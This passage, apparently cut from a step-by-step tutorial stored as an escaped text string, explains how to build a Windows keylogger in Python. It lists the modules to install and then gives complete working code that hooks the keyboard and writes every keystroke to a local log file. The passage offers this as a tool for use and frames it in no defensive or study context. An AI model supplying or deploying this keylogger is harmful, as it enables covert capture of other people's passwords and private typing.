    \ python program is obvious; and unless you already have downloaded a file with\
    \ a pre-compiled keylogger, you need to install Python alongside a couple of modules.\n\
    \nDownload and install these modules:\n\n- Latest Python version\n- [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)\n\
    - [PyHook](https://sourceforge.net/projects/pyhook/)\n\n## STEP 2: CREATE THE\
    \ CODE\n\n```python\nimport pyHook, pythoncom, sys, logging\n\nfile_log = 'keyloggeroutput.txt'\n\
    \ndef OnKeyboardEvent(event):\n    logging.basicConfig(filename=file_log, level=logging.DEBUG,\
    \ format='%(message)s')\n    chr(event.Ascii)\n    logging.log(10, chr(event.Ascii))\n\
    \    return True\n\nhooks_manager = pyHook.HookManager()\nhooks_manager.KeyDown\
    \ = OnKeyboardEvent\nhooks_manager.HookKeyboard()\npythoncom.PumpMessages()\n\
    ```"
